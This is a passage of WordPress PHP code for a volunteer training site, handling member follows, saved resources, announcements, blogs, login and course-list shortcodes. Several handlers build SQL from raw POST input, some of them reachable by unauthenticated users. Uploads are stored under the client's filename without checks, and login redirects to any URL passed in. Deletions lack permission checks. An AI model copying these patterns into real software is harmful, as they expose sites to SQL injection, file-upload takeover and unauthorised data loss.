    header('Expires: 0');
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    ob_clean();
    flush();
    readfile($file);
    exit;

}


function follow_member($query) {
      global $wpdb;
     $tablename =  'member_follow';
    if(!empty($_POST['follow_member']))
    {
        
         $member_id = ($_POST['member_id'])?sanitize_text_field($_POST['member_id']):"";
         $current_user_id = get_current_user_id();
         $group_id = ($_POST['group_id'])?sanitize_text_field($_POST['group_id']):"";
          $wordpress_post = array(
            'invited_to' => $member_id,
            'invited_from' => $current_user_id,
            'status' => 'pending',
            'group_id' => $group_id
            );  
        
         $wpdb->insert('member_follow',$wordpress_post);

        add_action('form_message',"Member followed  Successfully"); 
     
}
}
add_action('init', 'follow_member');



function follow_member1() {
        global $wpdb;
        $responseData = array();
        //$group_id = sanitize_text_field($_POST['group_id']);
        $member_id = sanitize_text_field($_POST['mid']);
        $current_user_id = get_current_user_id();

        $sql = "SELECT * FROM member_follow WHERE invited_to = '".$member_id."' AND invited_from ='".$current_user_id."' ";
        $check = $wpdb->get_results( $sql,ARRAY_A); 
        $responseData['sql'] = $sql;
        $responseData['ums'] = $check;
        if(count($check )>0){
            $responseData['msg'] = "Un Follow"; 
            $responseJson = json_encode($responseData); 
            echo $responseJson;
            die();
        }
        
          $insertData = array(
            'invited_to' => $member_id,
            'invited_from' => $current_user_id,
            'status' => 'pending',
            //'group_id' => $group_id
            );          
        $wpdb->insert('member_follow',$insertData);
        $responseData['responseData'] = $responseData;
         $responseData['sql'] = $sql;
        $responseData['msg'] = "Un Follow"; 
        $responseJson = json_encode($responseData); 
        echo $responseJson;
        die();
    }


add_action( 'wp_ajax_follow_member1', 'follow_member1' );  
add_action( 'wp_ajax_nopriv_follow_member1', 'follow_member1' );


function unfollow_member() {
        global $wpdb;
        $responseData = array();
        //$group_id = sanitize_text_field($_POST['group_id']);
        $member_id = sanitize_text_field($_POST['mid']);
        $current_user_id = get_current_user_id();                 

        //ld_update_group_access( $member_id, $group_id,true );
        $uu = $wpdb->delete('member_follow', array('invited_to' => $member_id,'invited_from'=>$current_user_id));


        $responseData['sql'] = $uu;
        $responseData['msg'] = "Follow"; 
        $responseJson = json_encode($responseData); 
        echo $responseJson;
        die();
    }
    add_action( 'wp_ajax_unfollow_member', 'unfollow_member' );  
    add_action( 'wp_ajax_nopriv_unfollow_member', 'unfollow_member' );




function save_resource_media() {
        global $wpdb;
        $responseData = array();
        $rmid = $_POST['rmid'];
        $current_user_id = get_current_user_id();                 
        $sql = "SELECT * FROM wp_saved_resources WHERE resource_id = '".$rmid."' 
                AND user_id = '".$current_user_id."'";
        $check = $wpdb->get_results( $sql,ARRAY_A); 
        $myArr['sql'] = $sql;
        $myArr['ums'] = $check;
        if(count($check )>0){
            $myArr['msg'] = "Resource media already saved"; 
            $myJSON = json_encode($myArr); 
            echo $myJSON;
            die();
        }        
       
         $group_id = ($_POST['group_id'])?$_POST['group_id']:"";
         $insertData = array(
            'resource_id' => $rmid,
            'user_id' => $current_user_id,
            'group_id' => $group_id
            );  
        
         $dd = $wpdb->insert('wp_saved_resources',$insertData);
         $myArr['sql'] = $dd;
        $myArr['msg'] = "Resource media saved successfully"; 
            $myJSON = json_encode($myArr); 
            echo $myJSON;
            die();

    }
    add_action( 'wp_ajax_save_resource_media', 'save_resource_media' );  
    add_action( 'wp_ajax_nopriv_save_resource_media', 'save_resource_media' );






function create_announcement() {
    
    if(!empty($_POST['create_announcement']))
    {
          $post_title = ($_POST['post_title'])?sanitize_text_field($_POST['post_title']):"";
        $post_content = ($_POST['post_content'])?sanitize_text_field($_POST['post_content']):"";
        $current_user_id = get_current_user_id();
            $wordpress_post = array(
            'post_title' => $post_title,
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'announcement'
            );

        $announcement_id =     wp_insert_post( $wordpress_post );
        add_post_meta( $announcement_id, 'announcement_group_id', @$_POST['ugroup_id']);

        
    //Set thumbnail image   
    
         $uploaddir = wp_upload_dir();
    $file = $_FILES["group_image"]["name"];
    $uploadfile = $uploaddir['path'] . '/' . basename( $file );

    if(move_uploaded_file( $_FILES["group_image"]["tmp_name"] , $uploadfile )){
        $filename = basename( $uploadfile );
        $wp_filetype = wp_check_filetype(basename($filename), null );
        $attachment = array(
        'post_mime_type' => $wp_filetype['type'],
        'post_title' => preg_replace('/\.[^.]+$/', '', $filename),
        'post_content' => '',
        'post_status' => 'inherit',
        'menu_order' => $_i + 1000
        );
        $attach_id = wp_insert_attachment( $attachment, $uploadfile );
        set_post_thumbnail( $announcement_id, $attach_id ); 
    }
        
      header('Location: '.$_SERVER["HTTP_REFERER"]);
        exit;
    }
}
add_action('init', 'create_announcement');


function update_announcement() {
    
    if(!empty($_POST['update_announcement']))
    {
          $announcement_id = ($_POST['edit_ann_id'])?sanitize_text_field($_POST['edit_ann_id']):"";
          $post_title = ($_POST['post_title'])?sanitize_text_field($_POST['post_title']):"";
        $post_content = ($_POST['post_content'])?sanitize_text_field($_POST['post_content']):"";
        $current_user_id = get_current_user_id();
            $updatePostData = array(
                 'ID' => $announcement_id,
           
            'post_title' => $post_title,
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'announcement'
            );

         wp_update_post( $updatePostData );

        update_post_meta( $announcement_id, 'announcement_group_id', @$_POST['ugroup_id']);

        
    //Set thumbnail image   
    
         $uploaddir = wp_upload_dir();
    $file = $_FILES["group_image"]["name"];
    $uploadfile = $uploaddir['path'] . '/' . basename( $file );

    if(move_uploaded_file( $_FILES["group_image"]["tmp_name"] , $uploadfile )){
        $filename = basename( $uploadfile );
        $wp_filetype = wp_check_filetype(basename($filename), null );
        $attachment = array(
        'post_mime_type' => $wp_filetype['type'],
        'post_title' => preg_replace('/\.[^.]+$/', '', $filename),
        'post_content' => '',
        'post_status' => 'inherit',
        'menu_order' => $_i + 1000
        );
        $delete = wp_delete_attachment($announcement_id,true);
        $attach_id = wp_insert_attachment( $attachment, $uploadfile );
        set_post_thumbnail( $announcement_id, $attach_id ); 
    }
        
      header('Location: '.$_SERVER["HTTP_REFERER"]);
        exit;
    }
}
add_action('init', 'update_announcement');



function delete_announcement($query) {
    if(!empty($_POST['delete_announcement']))
    {
        $post_id  =  $_POST['ann_id'];   
        wp_delete_post($post_id);
        add_action('form_message',"Announcement Deleted Successfully"); 
     
}
}
add_action('init', 'delete_announcement');



function create_blog() {
    
    if(!empty($_POST['create_blog']))
    {
          $post_title = ($_POST['post_title'])?sanitize_text_field($_POST['post_title']):"";
          $post_content = ($_POST['post_content'])?sanitize_text_field($_POST['post_content']):"";
          $blog_group_id = ($_POST['blog_group_id'])?sanitize_text_field($_POST['blog_group_id']):"";
           $blog_groups = ($_POST['blog_groups'])?sanitize_text_field($_POST['blog_groups']):"";
          $current_user_id = get_current_user_id();
          //echo $current_user_id;
         // die();
            $wordpress_post = array(
            'post_title' => $post_title,
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'post'
            );
        
        $blog_id  =  wp_insert_post( $wordpress_post );
        
        if($blog_group_id == 'all_users')
          {
             add_post_meta( $blog_id, 'blog_group_id', @$_POST['blog_group_id']);
          }
          else
          {
              add_post_meta( $blog_id, 'blog_group_id', @$_POST['blog_groups']);
            
          }
        

    //Set thumbnail image   
             $uploaddir = wp_upload_dir();

    $file = $_FILES["group_image"]["name"];
    $uploadfile = $uploaddir['path'] . '/' . basename( $file );

    if(move_uploaded_file( $_FILES["group_image"]["tmp_name"] , $uploadfile )){
        $filename = basename( $uploadfile );
        $wp_filetype = wp_check_filetype(basename($filename), null );
        $attachment = array(
        'post_mime_type' => $wp_filetype['type'],
        'post_title' => preg_replace('/\.[^.]+$/', '', $filename),
        'post_content' => '',
        'post_status' => 'inherit',
        'menu_order' => $_i + 1000
        );
        $attach_id = wp_insert_attachment( $attachment, $uploadfile );
        set_post_thumbnail( $blog_id, $attach_id ); 
    }

      // Set thumbnail image    
  
       header('Location: '.$_SERVER["HTTP_REFERER"]);
        exit;
    }
}
add_action('init', 'create_blog');


function loginUsers($query)
{
    global $wpdb;
    if(!empty($_POST['loginUsers']))
    {

         $email = ($_POST['email'])?sanitize_text_field($_POST['email']):"";
         $password = ($_POST['password'])?sanitize_text_field($_POST['password']):"";
          $user =  wp_login($email,$password);
            if($user)
            {
                $user = get_user_by('email', $email);
                  wp_set_current_user($user->ID);
                  wp_set_auth_cookie($user->ID);
                  if(!empty($_GET['url'])){
                        
                    wp_redirect($_GET['url']);
                     exit;
                  } 
                  else{
                  wp_redirect(site_url('dashboard-home'));
                     exit;  
                  }
             }
            else 
            {
                
                // return new WP_Error( 'Error', 'Invalid Email or Password, Please try again !' );
                 echo "<script>alert('Sorry! Invalid login credentials.')</script>";
               return new WP_Error('invalid_user', 'Invalid User.', array('status' => 200));

               
            }
        add_action('form_message',"User login  Successfully"); 
    }
}
add_action('init', 'loginUsers');






function delete_blog($query) {
    if(!empty($_POST['delete_blog']))
    {
        $post_id  =  $_POST['blog_id'];   
        wp_delete_post($post_id);
        add_action('form_message',"Blog Deleted Successfully"); 
     
}
}
add_action('init', 'delete_blog');




function ums_elementor_shortcode( $atts ) {

$cat_id = 40;
$args=array(
    'posts_per_page' => 50,    
    'post_type' => 'sfwd-courses',
    'tax_query' => array(
        array(
            'taxonomy' => 'ld_course_category', //double check your taxonomy name in you dd 
            'field'    => 'id',
            'terms'    => $cat_id,
        ),
       ),
     );

 $ums = get_posts($args);
    

    $str ='<div class="container training">
    <div class="section-title">
        <h2>Courses List</h2>
          </div>
    <div class="tab-section">
        <div id="tab-1" class="tabcontent" style="display:block;">
            <div class="course-result">
                <span>'.count($ums).' Result</span>
            </div>';
            if ( count($ums)>0 ) {
             foreach ( $ums as $val ) {
                $groupImg = wp_get_attachment_url( get_post_thumbnail_id($val->ID) );
                if(empty($groupImg)){                                                        
                    $groupImg= site_url('wp-content/uploads/2022/12/dva-logo.png');
                }
            $str .='<div class="mb-3">
                <div class="course-wrapper mb-3">
                    <div class="course-row">
                        <div class="course-image d-flex align-items-center">
                            <img src="'.$groupImg.'" alt="" height="365" width="260">
                        </div>
                        <div class="course-content">
                            <h3>'.$val->post_title.'</h3>
                           
                            <div class="course-meta">
                                <ul>
                                    <li>'.get_field("course_hour",$val->ID).'Total hour</li>
                                    <li>All Levels</li>
                                </ul>
                            </div>
                            <p>'.get_field("course_description",$val->ID).'</p>
                            <div class="custom-btn">
                                <a href="'.get_permalink($val->ID).'" class="btn btn-primary">Get Started</a>   
                            </div>
                        </div>
                    </div>
                </div>
            </div>';
            } 
        }

            $str .='</div>
            </div>';
      echo  $str;
}
add_shortcode( 'ums_elementor_php_output', 'ums_elementor_shortcode');




/*Standalone training*/
    function ums_elementor_standalone_shortcode( $atts ) {

$cat_id = 41;
$args=array(
    'posts_per_page' => 10,
    'posts_total' => 50, 
    'post_type' => 'sfwd-courses',
    'mid_size'  => 2,
    
    'tax_query' => array(
        array(
            'taxonomy' => 'ld_course_category', //double check your taxonomy name in you dd 
            'field'    => 'id',
            'terms'    => $cat_id,
        ),
        
       ),
     );

 $ums = get_posts($args);
    

    $str ='<div class="container training">
    <div class="section-title">
        <h2>Courses List</h2>
    </div>
    <div class="tab-section">
        <div id="tab-1" class="tabcontent" style="display:block;">
            <div class="course-result abhi">
                <span>'.count($ums).' Result</span>
            </div>';
            if ( count($ums)>0 ) {
             foreach ( $ums as $val ) {
                $groupImg = wp_get_attachment_url( get_post_thumbnail_id($val->ID) );
                if(empty($groupImg)){                                                        
                    $groupImg= site_url('wp-content/uploads/2022/12/dva-logo.png');
                }
            $str .='<div class="mb-3">
                <div class="course-wrapper mb-3">
                    <div class="course-row">
                        <div class="course-image d-flex align-items-center">
                            <img src="'.$groupImg.'" alt="" height="365" width="260">
                        </div>
                        <div class="course-content">
                            <h3>'.$val->post_title.'</h3>
                        
                            <div class="course-meta">
                                <ul>
                                    <li>'.get_field("course_hour",$val->ID).'Total hour</li>
                                    <li>All Levels</li>
                                </ul>
                            </div>
                            <p>'.get_field("course_description",$val->ID).'</p>
                            <div class="custom-btn">
                                <a href="'.get_permalink($val->ID).'" class="btn btn-primary">Get Started</a>   
                            </div>
                        </div>
                    </div>
                </div>
            </div>';
            } 
        }

            $str .='</div>
            </div>';
      echo  $str;
}
add_shortcode( 'ums_elementor_standalone_traing', 'ums_elementor_standalone_shortcode');

/*Standalone training*/


/*Just in time training*/

  function justInTime_standalone_shortcode( $atts ) {

$cat_id = 49;
$args=array(
   /* 'posts_per_page' => 10,*/
    'paged' => ( get_query_var('paged') ? get_query_var('paged') : 1 ), 
    /*'posts_total' => 50, */
    'post_type' => 'sfwd-courses',
    'mid_size'  => 2,
    
    'tax_query' => array(
        array(
            'taxonomy' => 'ld_course_category', //double check your taxonomy name in you dd 
            'field'    => 'id',
            'terms'    => $cat_id,
        ),
        
       ),
     );

 $ums = get_posts($args);
    

    $str ='<div class="container training">
    <div class="section-title">
        <h2>Courses List</h2>
    </div>
    <div class="tab-section">
        <div id="tab-1" class="tabcontent" style="display:block;">
            <div class="course-result abhi">
                <span>'.count($ums).' Result</span>
            </div>';
            if ( count($ums)>0 ) {
                 $count_the_posts = 0;
             foreach ( $ums as $val ) {
                  $count_the_posts++;
                $groupImg = wp_get_attachment_url( get_post_thumbnail_id($val->ID) );
                if(empty($groupImg)){                                                        
                    $groupImg= site_url('wp-content/uploads/2022/12/dva-logo.png');
                }
            $str .='<div class="mb-3">
                <div class="course-wrapper mb-3">
                    <div class="course-row">
                        <div class="course-image d-flex align-items-center">
                            <img src="'.$groupImg.'" alt="" height="365" width="260">
                        </div>
                        <div class="course-content">
                            <h3>'.$val->post_title.'</h3>
                            
                            <div class="course-meta">
                                <ul>
                                    <li>'.get_field("course_hour",$val->ID).'Total hour</li>
                                    <li>All Levels</li>
                                </ul>
                            </div>
                            <p>'.wp_trim_words(get_field("course_description",$val->ID),25).'</p>
                            <div class="custom-btn">
                                <a href="'.get_permalink($val->ID).'" class="btn btn-primary">Get Started</a>   
                            </div>
                        </div>
                    </div>
                </div>
            </div>';
            } 
        }

            $str .='</div>
            </div>';
      echo  $str;


        echo "<div class='page-nav-container'>" . paginate_links(array(
    'total' => $count_the_posts,
    'prev_text' => __('<'),
    'next_text' => __('>')
)) . "</div>";
}
add_shortcode( 'just_in_time_training', 'justInTime_standalone_shortcode');


/*Just in time training */


/* Disaster Volunteer credentials*/

 function disaster_volunteer_shortcode( $atts ) {

$cat_id = 40;
$args=array(
    /*'posts_per_page' => 10,*/
    'paged' => ( get_query_var('paged') ? get_query_var('paged') : 1 ),   
    /*'posts_total' => 50,*/ 
    'post_type' => 'sfwd-courses',
    'mid_size'  => 2,
    
    'tax_query' => array(
        array(
            'taxonomy' => 'ld_course_category', //double check your taxonomy name in you dd 
            'field'    => 'id',
            'terms'    => $cat_id,
        ),
        
       ),
     );

 $ums = get_posts($args);
     
    $str ='<div class="container training">
    <div class="section-title">
        <h2>Courses List</h2>
    </div>
    <div class="tab-section">
        <div id="tab-1" class="tabcontent" style="display:block;">
            <div class="course-result abhi">
                <span>'.count($ums).' Result</span>
            </div>';
            if ( count($ums)>0 ) {
                $count_the_posts = 0;
             foreach ( $ums as $val ) {
                $count_the_posts++;
                $groupImg = wp_get_attachment_url( get_post_thumbnail_id($val->ID) );
                if(empty($groupImg)){                                                        
                    $groupImg= site_url('wp-content/uploads/2022/12/dva-logo.png');
                }
            $str .='<div class="mb-3">
                <div class="course-wrapper mb-3">
                    <div class="course-row">
                        <div class="course-image d-flex align-items-center">
                            <img src="'.$groupImg.'" alt="" height="365" width="260">
                        </div>
                        <div class="course-content">
                            <h3>'.$val->post_title.'</h3>
                            
                            <div class="course-meta">
                                <ul>
                                    <li>'.get_field("course_hour",$val->ID).' total hour</li>
                                    <li>All Levels</li>
                                </ul>
                            </div>
                            <p>'.wp_trim_words(get_field("course_description",$val->ID),25).'</p>
                            <div class="custom-btn">
                                <a href="'.get_permalink($val->ID).'" class="btn btn-primary">Get Started</a>   
                            </div>
                        </div>
                    </div>
                </div>
            </div>';
            } 
        }

         


            $str .='</div>
            </div>';
      echo  $str;

    echo "<div class='page-nav-container'>" . paginate_links(array(
    'total' => $count_the_posts,
    'prev_text' => __('<'),
    'next_text' => __('>')
)) . "</div>";
}
add_shortcode( 'disaster_volunteer_credentials', 'disaster_volunteer_shortcode');


/* Disaster Volunteer credentials*/



/*General Readiness course list*/

function genearlReadiness_standalone_shortcode( $atts ) {

$cat_id = 75;
$args=array(
    'posts_per_page' => 10,
    'posts_total' => 50, 
    'post_type' => 'sfwd-courses',
    'mid_size'  => 2,
    
    'tax_query' => array(
        array(
            'taxonomy' => 'ld_course_category', //double check your taxonomy name in you dd 
            'field'    => 'id',
            'terms'    => $cat_id,
        ),
        
       ),
     );

 $ums = get_posts($args);
    

    $str ='<div class="container training">
    <div class="section-title">
        <h2>Courses List</h2>
    </div>
    <div class="tab-section">
        <div id="tab-1" class="tabcontent" style="display:block;">
            <div class="course-result abhi">
                <span>'.count($ums).' Result</span>
            </div>';
            if ( count($ums)>0 ) {
             foreach ( $ums as $val ) {
                $groupImg = wp_get_attachment_url( get_post_thumbnail_id($val->ID) );
                if(empty($groupImg)){                                                        
                    $groupImg= site_url('wp-content/uploads/2022/12/dva-logo.png');
                }
            $str .='<div class="mb-3">
                <div class="course-wrapper mb-3">
                    <div class="course-row">
                        <div class="course-image d-flex align-items-center">
                            <img src="'.$groupImg.'" alt="" height="365" width="260">
                        </div>
                        <div class="course-content">
                            <h3>'.$val->post_title.'</h3>
                           
                            <div class="course-meta">
                                <ul>
                                    <li>'.get_field("course_hour",$val->ID).'Total hour</li>
                                    <li>All Levels</li>
                                </ul>
                            </div>
                            <p>'.get_field("course_description",$val->ID).'</p>
                            <div class="custom-btn">
                                <a href="'.get_permalink($val->ID).'" class="btn btn-primary">Get Started</a>   
                            </div>
                        </div>
                    </div>
                </div>
            </div>';
            } 
        }

            $str .='</div>
            </div>';
      echo  $str;
}
add_shortcode( 'general_readiness_course', 'genearlReadiness_standalone_shortcode');


/*Genearl Readiness course list*/

/*DV 101 course*/
function DV103_standalone_shortcode( $atts ) {

$cat_id = 79;
$args=array(
    'posts_per_page' => 10,
    'posts_total' => 50, 
    'post_type' => 'sfwd-courses',
    'mid_size'  => 2,
    
    'tax_query' => array(
        array(
            'taxonomy' => 'ld_course_category', //double check your taxonomy name in you dd 
            'field'    => 'id',
            'terms'    => $cat_id,
        ),
        
       ),
     );

    $ums = get_posts($args);
    $str ='<div class="container training">
    <div class="section-title">
        <h2>Courses List</h2>
    </div>
    <div class="tab-section">
        <div id="tab-1" class="tabcontent" style="display:block;">
            <div class="course-result abhi">
                <span>'.count($ums).' Result</span>
            </div>';
            if ( count($ums)>0 ) {
             foreach ( $ums as $val ) {
                $groupImg = wp_get_attachment_url( get_post_thumbnail_id($val->ID) );
                if(empty($groupImg)){                                                        
                    $groupImg= site_url('wp-content/uploads/2022/12/dva-logo.png');
                }
            $str .='<div class="mb-3">
                <div class="course-wrapper mb-3">
                    <div class="course-row">
                        <div class="course-image d-flex align-items-center">
                            <img src="'.$groupImg.'" alt="" height="365" width="260">
                        </div>
                        <div class="course-content">
                            <h3>'.$val->post_title.'</h3>
                            
                            <div class="course-meta">
                                <ul>
                                    <li>'.get_field("course_hour",$val->ID).'Total hour</li>
                                    <li>All Levels</li>
                                </ul>
                            </div>
                            <p>'.get_field("course_description",$val->ID).'</p>
                            <div class="custom-btn">
                                <a href="'.get_permalink($val->ID).'" class="btn btn-primary">Get Started</a>   
                            </div>
                        </div>
                    </div>
                </div>
            </div>';
            } 
        }

            $str .='</div>
            </div>';
      echo  $str;
}
add_shortcode( 'dv103_course', 'DV103_standalone_shortcode');

/*DV 103 Course*/








/*DV 102 course*/
function DV102_standalone_shortcode( $atts ) {

$cat_id = 77;
$args=array(
    'posts_per_page' => 10,
    'posts_total' => 50, 
    'post_type' => 'sfwd-courses',
    'mid_size'  => 2,
    
    'tax_query' => array(
        array(
            'taxonomy' => 'ld_course_category', //double check your taxonomy name in you dd 
            'field'    => 'id',
            'terms'    => $cat_id,
        ),
        
       ),
     );

    $ums = get_posts($args);
    $str ='<div class="container training">
    <div class="section-title">
        <h2>Courses List</h2>
    </div>
    <div class="tab-section">
        <div id="tab-1" class="tabcontent" style="display:block;">
            <div class="course-result abhi">
                <span>'.count($ums).' Result</span>
            </div>';
            if ( count($ums)>0 ) {
             foreach ( $ums as $val ) {
                $groupImg = wp_get_attachment_url( get_post_thumbnail_id($val->ID) );
                if(empty($groupImg)){                                                        
                    $groupImg= site_url('wp-content/uploads/2022/12/dva-logo.png');
                }
            $str .='<div class="mb-3">
                <div class="course-wrapper mb-3">
                    <div class="course-row">
                        <div class="course-image d-flex align-items-center">
                            <img src="'.$groupImg.'" alt="" height="365" width="260">
                        </div>
                        <div class="course-content">
                            <h3>'.$val->post_title.'</h3>
                            
                            <div class="course-meta">
                                <ul>
                                    <li>'.get_field("course_hour",$val->ID).'Total hour</li>
                                    <li>All Levels</li>
                                </ul>
                            </div>
                            <p>'.get_field("course_description",$val->ID).'</p>
                            <div class="custom-btn">
                                <a href="'.get_permalink($val->ID).'" class="btn btn-primary">Get Started</a>   
                            </div>
                        </div>
                    </div>
                </div>
            </div>';
            } 
        }

            $str .='</div>
            </div>';
      echo  $str;
}
add_shortcode( 'dv102_course', 'DV102_standalone_shortcode');

/*DV 102 Course*/



/*leadeship*/
function leadership_standalone_shortcode( $atts ) {

$cat_id = 44;
$args=array(
    'posts_per_page' => 10,
    'posts_total' => 50, 
    'post_type' => 'sfwd-courses',
    'mid_size'  => 2,
    
    'tax_query' => array(
        array(
            'taxonomy' => 'ld_course_category', //double check your taxonomy name in you dd 
            'field'    => 'id',
            'terms'    => $cat_id,
        ),
        
       ),
     );

    $ums = get_posts($args);
    $str ='<div class="container training">
    <div class="section-title">
        <h2>Courses List</h2>
    </div>
    <div class="tab-section">
        <div id="tab-1" class="tabcontent" style="display:block;">
            <div class="course-result abhi">
                <span>'.count($ums).' Result</span>
            </div>';
            if ( count($ums)>0 ) {
             foreach ( $ums as $val ) {
                $groupImg = wp_get_attachment_url( get_post_thumbnail_id($val->ID) );
                if(empty($groupImg)){                                                        
                    $groupImg= site_url('wp-content/uploads/2022/12/dva-logo.png');
                }
            $str .='<div class="mb-3">
                <div class="course-wrapper mb-3">
                    <div class="course-row">
                        <div class="course-image d-flex align-items-center">
                            <img src="'.$groupImg.'" alt="" height="365" width="260">
                        </div>
                        <div class="course-content">
                            <h3>'.$val->post_title.'</h3>
                            
                            <div class="course-meta">
                                <ul>
                                    <li>'.get_field("course_hour",$val->ID).'Total hour</li>
                                    <li>All Levels</li>
                                </ul>
                            </div>
                            <p>'.get_field("course_description",$val->ID).'</p>
                            <div class="custom-btn">
                                <a href="'.get_permalink($val->ID).'" class="btn btn-primary">Get Started</a>   
                            </div>
                        </div>
                    </div>
                </div>
            </div>';
            } 
        }

            $str .='</div>
            </div>';
      echo  $str;
}
add_shortcode( 'leadership_course_list', 'leadership_standalone_shortcode');

/*leadership*/



function ums_covid_training_elementor_shortcode( $atts ) {

$cat_id = 38;
$args=array(
    /*'posts_per_page' => 50,  */
    'paged' => ( get_query_var('paged') ? get_query_var('paged') : 1 ),  
    'post_type' => 'sfwd-courses',
    'tax_query' => array(
        array(
            'taxonomy' => 'ld_course_category', //double check your taxonomy name in you dd 
            'field'    => 'id',
            'terms'    => $cat_id,
        ),
       ),
     );

 $ums = get_posts($args);


    $str ='<div class="container training">
    <div class="section-title">
        <h2>Courses List</h2>
    </div>
    <div class="tab-section">
        <div id="tab-1" class="tabcontent" style="display:block;">
            <div class="course-result">
                <span>'.count($ums).' Result</span>
            </div>';
            if ( count($ums)>0 ) {
                $count_the_posts = 0;
             foreach ( $ums as $val ) {
                  $count_the_posts++;
                $groupImg = wp_get_attachment_url( get_post_thumbnail_id($val->ID) );
                if(empty($groupImg)){                                                        
                    $groupImg= site_url('wp-content/uploads/2022/12/dva-logo.png');
                }
            $str .='<div class="mb-3">
                <div class="course-wrapper mb-3">
                    <div class="course-row">
                        <div class="course-image d-flex align-items-center">
                            <img src="'.$groupImg.'" alt="" height="365" width="260">
                        </div>
                        <div class="course-content">
                            <h3>'.$val->post_title.'</h3>
                           
                            <div class="course-meta">
                                <ul>
                                    <li>'.get_field("course_hour",$val->ID).'Total hour</li>
                                    <li>All Levels</li>
                                </ul>
                            </div>
                            <p>'.wp_trim_words(get_field("course_description",$val->ID),25).'</p>
                            <div class="custom-btn">
                                <a href="'.get_permalink($val->ID).'" class="btn btn-primary">Get Started</a>   
                            </div>
                        </div>
                    </div>
                </div>
            </div>';
            } 
        }

            $str .='</div>
            </div>';
      echo  $str;

       echo "<div class='page-nav-container'>" . paginate_links(array(
    'total' => $count_the_posts,
    'prev_text' => __('<'),
    'next_text' => __('>')
)) . "</div>";
}
add_shortcode( 'ums_covid_training', 'ums_covid_training_elementor_shortcode');



function ums_language_training_elementor_shortcode( $atts ) {

$cat_id = 47;

$args11 = array(
                'taxonomy' => 'ld_course_category',
                'orderby' => 'name',
                'order'   => 'ASC',
                'parent' => $cat_id
            );
            $cats2 = get_categories($args11);

    $str ='<div class="container training">
    <div class="section-title">
        <h2>Courses List</h2>
    </div>
    <div class="tab-section">
    <div class="tab">';

        $j=1;
        foreach($cats2 as $cat) {
            $active = '';
            if($j===1){
            $active =  'active';
            }

            $tabs = "'tab-".$cat->term_id."'";


            $str .='<button class="tablinks '.$active.'" onclick="openCity(event, '.$tabs.')">'.$cat->name.'</button>';                    

            $j++;
        }
      $str .='</div>';
        $i=1;
        foreach($cats2 as $cat1) { 

        $args=array(
                    'posts_per_page' => 50,   
                    'post_type' => 'sfwd-courses',
                    'tax_query' => array(
                        array(
                            'taxonomy' => 'ld_course_category',
                            'field'    => 'id',
                            'terms'    => $cat1->term_id,
                        ),
                       ),
             ); 
         $ums = get_posts($args);
         $style= 'display:none'; 
        if($i===1)
        {
             $style= 'display:block !important';    
        } 
        


        $str .='<div id="tab-'.$cat1->term_id.'" class="tabcontent" style='.$style.'">
            <div class="course-result">
                <span>'.count($ums).' Result</span>
            </div>';
            $i++;
            if ( count($ums)>0 ) {
             foreach ( $ums as $val ) {
                $groupImg = wp_get_attachment_url( get_post_thumbnail_id($val->ID) );
                if(empty($groupImg)){                                                        
                    $groupImg= site_url('wp-content/uploads/2022/12/dva-logo.png');
                }
            $str .='<div class="mb-3">
                <div class="course-wrapper mb-3">
                    <div class="course-row">
                        <div class="course-image d-flex align-items-center">
                            <img src="'.$groupImg.'" alt="" height="365" width="260">
                        </div>
                        <div class="course-content">
                            <h3>'.$val->post_title.'</h3>
                            
                            <div class="course-meta">
                                <ul>
                                    <li>'.get_field("course_hour",$val->ID).'Total hour</li>
                                    <li>All Levels</li>
                                </ul>
                            </div>
                            <p>'.get_field("course_description",$val->ID).'</p>
                            <div class="custom-btn">
                                <a href="'.get_permalink($val->ID).'" class="btn btn-primary">Get Started</a>   
                            </div>
                        </div>
                    </div>
                </div>
            </div>';
            } 
        }

            $str .='</div>';
     
             }
             $str .='</div></div><script><script>
function openCity(evt, cityName) {
  var i, tabcontent, tablinks;
  tabcontent = document.getElementsByClassName("tabcontent");
  for (i = 0; i < tabcontent.length; i++) {
    tabcontent[i].style.display = "none";
  }
  tablinks = document.getElementsByClassName("tablinks");
  for (i = 0; i < tablinks.length; i++) {
    tablinks[i].className = tablinks[i].className.replace(" active", "");
  }
  document.getElementById(cityName).style.display = "block";
  evt.currentTarget.className += " active";
}
</script></script>';
       
      echo  $str;

}
add_shortcode( 'ums_language_training', 'ums_language_training_elementor_shortcode');




/*Standalone training page*/

function standalone_trainig_shortcode( $atts ) {

$cat_id = 74;

$args11 = array(
                'taxonomy' => 'ld_course_category',
                'orderby' => 'name',
                'order'   => 'ASC',
                'parent' => $cat_id
            );
            $cats2 = get_categories($args11);

    $str ='<div class="container training">
    <div class="section-title">
        <h2>Courses List</h2>
    </div>
    <div class="tab-section">
    <div class="tab">';

        $j=1;
        foreach($cats2 as $cat) {
            $active = '';
            if($j===1){
            $active =  'active';
            }

            $tabs = "'tab-".$cat->term_id."'";


            $str .='<button class="tablinks '.$active.'" onclick="openCity(event, '.$tabs.')">'.$cat->name.'</button>';                    

            $j++;
        }
      $str .='</div>';
        $i=1;
        foreach($cats2 as $cat1) { 

        $args=array(
                    'posts_per_page' => 50,    
                    'post_type' => 'sfwd-courses',
                    'tax_query' => array(
                        array(
                            'taxonomy' => 'ld_course_category',
                            'field'    => 'id',
                            'terms'    => $cat1->term_id,
                        ),
                       ),
             ); 
         $ums = get_posts($args);
         $style= 'display:none'; 
        if($i===1)
        {
             $style= 'display:block !important';    
        } 
        


        $str .='<div id="tab-'.$cat1->term_id.'" class="tabcontent" style='.$style.'">
            <div class="course-result">
                <span>'.count($ums).' Result</span>
            </div>';
            $i++;
            if ( count($ums)>0 ) {
             foreach ( $ums as $val ) {
                $groupImg = wp_get_attachment_url( get_post_thumbnail_id($val->ID) );
                if(empty($groupImg)){                                                        
                    $groupImg= site_url('wp-content/uploads/2022/12/dva-logo.png');
                }
            $str .='<div class="mb-3">
                <div class="course-wrapper mb-3">
                    <div class="course-row">
                        <div class="course-image d-flex align-items-center">
                            <img src="'.$groupImg.'" alt="" height="365" width="260">
                        </div>
                        <div class="course-content">
                            <h3>'.$val->post_title.'</h3>
                            
                            <div class="course-meta">
                                <ul>
                                    <li>'.get_field("course_hour",$val->ID).'Total hour</li>
                                    <li>All Levels</li>
                                </ul>
                            </div>
                            <p>'.get_field("course_description",$val->ID).'</p>
